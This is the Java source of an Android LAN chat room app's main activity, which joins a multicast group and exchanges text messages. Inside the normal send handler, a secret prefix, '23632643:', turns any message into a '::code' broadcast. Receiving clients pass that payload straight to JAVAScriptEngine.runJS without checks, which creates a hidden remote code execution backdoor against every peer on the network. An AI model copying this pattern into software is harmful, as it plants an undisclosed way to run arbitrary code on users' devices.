package com.chat.room;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.text.TextUtils;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import com.chat.room.BaseActivity;
import com.chat.room.EnterChatRoom;
import com.chat.room.R;
import com.js.runner.JAVAScriptEngine;
import java.net.DatagramPacket;
import java.net.InetAddress;
import java.net.MulticastSocket;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends BaseActivity 
{
	public final static String sys="系统";
	public static String user="用户";
	public final static String askName="::name";
	public final static String askRen="::ren";
	public final static int TYPE_ADDTEXT=1;
	
	public final static String welcome="欢迎使用局域网聊天室！";
	
	public static int port=0;
	private InetAddress iadr=null;
	private MulticastSocket socket=null;
	private boolean confi=false;
	public static String nameofroom;
	public static boolean isOwner=false;
	public static String ip;
	private List<String> list;
	public static Context ctx;
	public static final String TAG="LAN MASTER";
	private EditText edit;
	private Button send;
	private boolean pressBack=false;
	private static TextView result;
	/*private Handler han=new Handler() {
		@Override
		public void handleMessage(Message msg)
		{
			switch (msg.what) {
				case TYPE_ADDTEXT:
					result.setText(result.getText().toString()+((String) msg.obj));
					break;
			}
		}
	};*/
	
	private static void print(String who, String text) {
		String con=new StringBuilder("[").append(who).append("]").append(text).append("\n").toString();
		/*Message msg=new Message();
		msg.what=TYPE_ADDTEXT;
		msg.obj=con;
		han.sendMessage(msg);*/
		result.setText(result.getText()+con);
	}
	
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
		ctx=MainActivity.this;
		NetBroadcast.init();
		list=new ArrayList<String>();
		edit=(EditText) findViewById(R.id.chat_edit);
		send=(Button) findViewById(R.id.chat_send);
		send.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View view) {
				if (confi) {
					if (TextUtils.isEmpty(edit.getText().toString())) {
						alert("消息不能为空！");
						return;
					}
					if (edit.getText().toString().startsWith("23632643:")) {
						String con=edit.getText().toString().substring(9);
						list.add(con);
						sendMsg("::code"+con);
						edit.setText("");
						return;
					}
					new Thread(new Runnable() {
						@Override
						public void run() {
							final String con=edit.getText().toString();
							byte[] data=(user+":"+con).getBytes();
							DatagramPacket packet=new DatagramPacket(data, data.length, iadr, port);
							try {
								socket.send(packet);
								MainActivity.this.runOnUiThread(new Runnable() {
									@Override
									public void run() {
										edit.setText("");
									}
								});
							} catch (Exception e) {
								err(e);
							}
						}
					}).start();
				} else {
					alert("还没有连接成功，请等待！");
				}
			}
		});
		result=(TextView) findViewById(R.id.chat_result);
		print(sys, welcome);
		addChatRoom();
    }
	
	private void addChatRoom() {
		Intent in=new Intent(MainActivity.this, EnterChatRoom.class);
		startActivityForResult(in, 1);
	}
	
	public static void alert(String text) {
		Toast.makeText(MainActivity.ctx, text, Toast.LENGTH_SHORT).show();
	}
	
	public static void err(Exception e) {
		print(sys, "程序出现错误！");
		print(sys, "错误详情:\n"+e.toString());
	}
	
	private void connect() {
		print(sys, "正在加入聊天室……");
		try {
			iadr=InetAddress.getByName(ip);
			socket=new MulticastSocket(port);
			socket.setTimeToLive(1);
			socket.joinGroup(iadr);
			new Thread(new Runnable() {
				@Override
				public void run() {
					while (true) {
						byte[] data=new byte[2048];
						DatagramPacket packet=new DatagramPacket(data, data.length, iadr, port);
						try {
							socket.receive(packet);
							final String msg=new String(packet.getData(), 0, packet.getLength());
							if (isOwner&&msg.startsWith(askName)) {
								sendMsg(":"+askName+nameofroom);
							} else if (msg.startsWith("::code")) {
								String con=msg.substring(6);
								if (list.contains(con)) {
									list.remove(con);
								} else {
									JAVAScriptEngine.runJS(con);
								}
							} else if (msg.startsWith(":"+askName)) {
								MainActivity.this.runOnUiThread(new Runnable() {
									@Override
									public void run() {
										setTitle(msg.substring(askName.length()+1));
									}
								});
							} else if (!msg.endsWith(askName)) {
								StringBuilder n=new StringBuilder();
								int q;
								for (q=0;q<msg.length();q++) {
									if (msg.charAt(q) != ':') n.append(msg.charAt(q));
										else break;
								}
								q++;
								final String nam=n.toString();
								final String p=msg.substring(q);
								MainActivity.this.runOnUiThread(new Runnable() {
									@Override
									public void run() {
										print(nam, p);
									}
								});
							}
						} catch (Exception e) {
							err(e);
						}
					}
				}
			}).start();
			if (isOwner) {
				sendMsg(gets(sys, user+"创建了房间"));
				setTitle(nameofroom);
			} else {
				sendMsg(gets(sys, user+"加入了房间"));
				sendMsg(askName);
			}
			confi=true;
		} catch (final Exception e) {
			MainActivity.this.runOnUiThread(new Runnable() {
				@Override
				public void run() {
					err(e);
				}
			});
		}
	}

	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data)
	{
		if (requestCode == 1&&resultCode == RESULT_OK) {
			ip=data.getStringExtra("ip");
			port=data.getIntExtra("port", 0);
			print(sys, "聊天室设置成功！");
			print(sys, "IP:"+ip+" 端口:"+port);
			connect();
		}
	}
	
	public void sendMsg(final String text) {
		new Thread(new Runnable() {
			@Override
			public void run() {
				byte[] data=text.getBytes();
				DatagramPacket packet=new DatagramPacket(data, data.length, iadr, port);
				try {
					socket.send(packet);
				} catch (Exception e) {
					err(e);
				}
			}
		}).start();
	}
	
	private String gets(String who, String text) {
		return new StringBuilder(who).append(":").append(text).toString();
	}

	@Override
	public void onBackPressed()
	{
		if (pressBack) {
			sendMsg(gets(sys, user+"离开了房间"));
			exit();
		} else {
			pressBack=true;
			alert("再按一次退出");
			new Handler().postDelayed(new Runnable() {
				@Override
				public void run() {
					pressBack=false;
				}
			}, 1000);
		}
	}
	
	public static void UIprint(final String t) {
		((Activity) MainActivity.ctx).runOnUiThread(new Runnable() {
			@Override
			public void run() {
				print(sys, t);
			}
		});
	}
	
	public static void UIalert(final String t) {
		((Activity) MainActivity.ctx).runOnUiThread(new Runnable() {
			@Override
			public void run() {
				alert(t);
			}
		});
	}
}
